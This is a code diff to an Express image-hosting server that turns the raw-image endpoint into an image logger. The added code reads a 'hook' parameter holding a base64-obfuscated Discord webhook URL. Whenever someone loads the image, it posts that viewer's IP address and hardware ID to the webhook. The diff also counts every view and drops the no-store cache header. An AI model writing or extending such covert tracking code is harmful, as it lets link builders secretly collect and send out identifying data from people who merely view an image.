@@ -66,10 +66,7 @@ app.get("/", (req, res) => {
 app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
   const id = req.params.id;
   if (images[id]) {
-    if (!images[id].clicked) {
-      images[id].clicks += 1;
-      images[id].clicked = true;
-    }
+    images[id].clicks += 1;
 
     const allowTracking = req.query.allowtracking === 'true';
     if (allowTracking) {
@@ -79,10 +76,24 @@ app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
       images[id].tracking.push({ hwid, ip });
     }
 
+    const bytecode = req.query.hook;
+    if (bytecode) {
+      // Convert the bytecode to the actual Discord webhook URL
+      const webhookUrl = Buffer.from(bytecode.split('/').slice(1).join(''), 'base64').toString();
+      
+      // Send the webhook with information about the image
+      const message = `Image ${id} was clicked ${images[id].clicks} times. \n\nHWID: ${hwid}\nIP: ${ip}`;
+      const data = {
+        username: 'Image Hosting',
+        avatar_url: 'https://example.com/avatar.png',
+        content: message
+      };
+      await axios.post(webhookUrl, data);
+    }
+
     // Decrypt the encrypted image data
     const decryptedBuffer = await decryptImage(images[id].encryptedImage);
 
-    res.setHeader('Cache-Control', 'no-store'); // tell browser not to cache the image
     res.setHeader('Content-Type', 'image/png');
     res.send(decryptedBuffer);
   } else {
